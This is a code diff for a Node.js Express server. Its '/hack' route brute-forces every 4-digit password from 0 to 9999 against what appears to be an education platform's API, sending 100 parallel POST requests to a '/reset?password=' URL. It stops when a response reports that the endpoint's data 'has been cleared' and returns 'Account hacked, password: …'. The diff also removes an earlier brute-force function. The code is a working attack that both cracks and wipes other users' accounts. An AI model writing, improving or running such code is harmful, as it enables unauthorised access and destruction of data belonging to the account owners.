@@ -13,35 +13,52 @@ app.use(express.json());
 
 app.post("/hack", async (req, res) => {
   const data = req.body;
-  console.log("Received data:", data);
+  console.log(data);
 
-  res.json(response);
+  const payload = { text: await hack(data.endpoint) };
+  res.json(payload);
+  console.log(payload);
 });
 
-async function hack(endpoint, total = 10000, limit = 100) {
+async function hack(endpoint, max = 9999, limit = 100) {
+  let finished = false;
   let active = 0;
   let index = 0;
 
   return new Promise((resolve, reject) => {
-    let results = [];
     let completed = 0;
 
     function next() {
-      if (completed >= total) return resolve(results);
+      if (finished) return;
+      if (completed > max) {
+        finished = true;
+        return reject("Password not found");
+      }
 
-      while (active < limit && index < total) {
+      while (active < limit && index <= max) {
         ++active;
 
         fetch(
           "https://cs-api.pltw.org/" + endpoint + "/reset?password=" + index,
           { method: "POST" }
         )
-          .then((r) => r.text())
-          .then((body) => {
-            results[index] = body;
+          .then(async (r) => {
+            return { body: await r.text(), url: r.url };
+          })
+          .then((data) => {
+            if (finished) return;
+            if (
+              data.body ==
+              "Data for endpoint " + endpoint + " has been cleared."
+            ) {
+              let password = data.url.substring(data.url.lastIndexOf("=") + 1);
+              finished = true;
+              return resolve("Account hacked, password: " + password);
+            }
           })
           .catch((err) => {
-            results[index] = `error: ${err}`;
+            finished = true;
+            return reject(`Error: ${err}`);
           })
           .finally(() => {
             --active;
@@ -57,30 +74,10 @@ async function hack(endpoint, total = 10000, limit = 100) {
   });
 }
 
-async function hackBasic(endpoint) {
-  let requests = [];
-  let responses = [];
-
-  for (let i = 0; i <= 9999; ++i) {
-    requests.push(
-      fetch("https://cs-api.pltw.org/" + endpoint + "/reset?password=" + i, {
-        method: "POST",
-      })
-        .then((r) => r.text())
-        .catch((err) => `error: ${err}`)
-    );
-  }
-
-  responses = await Promise.all(requests);
-
-  return new Promise((resolve, reject) => {
-    resolve(responses);
-  });
-}
-
 app.post("/get", async (req, res) => {
   const data = req.body;
   console.log(data);
+
   const payload = { text: await getData(data.endpoint) };
   res.json(payload);
   console.log(payload);
